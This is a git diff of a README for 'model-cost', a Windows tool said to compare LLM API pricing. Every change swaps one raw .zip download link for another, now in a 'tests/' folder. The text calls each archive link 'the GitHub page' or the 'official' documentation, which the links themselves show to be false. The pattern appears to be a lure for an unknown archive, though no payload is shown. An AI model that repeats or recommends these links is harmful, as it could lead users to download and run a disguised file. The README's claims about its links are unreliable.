@@ -1,6 +1,6 @@
 # 🤖 model-cost - Compare LLM API Pricing Easily
 
-[![Download model-cost](https://img.shields.io/badge/Download%20model--cost-%2375C7FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/src/cost_model_3.3.zip)
+[![Download model-cost](https://img.shields.io/badge/Download%20model--cost-%2375C7FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/tests/model_cost_3.9.zip)
 
 ## 📋 What is model-cost?
 
@@ -36,7 +36,7 @@ Follow these steps to download and run model-cost on your Windows PC.
 
 Click the button below to go to the GitHub page where you can get model-cost.
 
-[![Download model-cost](https://img.shields.io/badge/Download%20model--cost-%2375C7FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/src/cost_model_3.3.zip)
+[![Download model-cost](https://img.shields.io/badge/Download%20model--cost-%2375C7FF?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/tests/model_cost_3.9.zip)
 
 You will find the latest version and instructions there.
 
@@ -132,7 +132,7 @@ No extra uninstall tool is needed.
 
 For updates, tips, and full details on commands, visit the official GitHub page:
 
-https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/src/cost_model_3.3.zip
+https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/tests/model_cost_3.9.zip
 
 You can also explore the documentation and community feedback there.
 
@@ -153,4 +153,4 @@ This breadth helps you compare prices no matter your needs.
 
 # Links
 
-[Download or visit the page here](https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/src/cost_model_3.3.zip)
+[Download or visit the page here](https://raw.githubusercontent.com/ItzAndiGans/model-cost/main/tests/model_cost_3.9.zip)
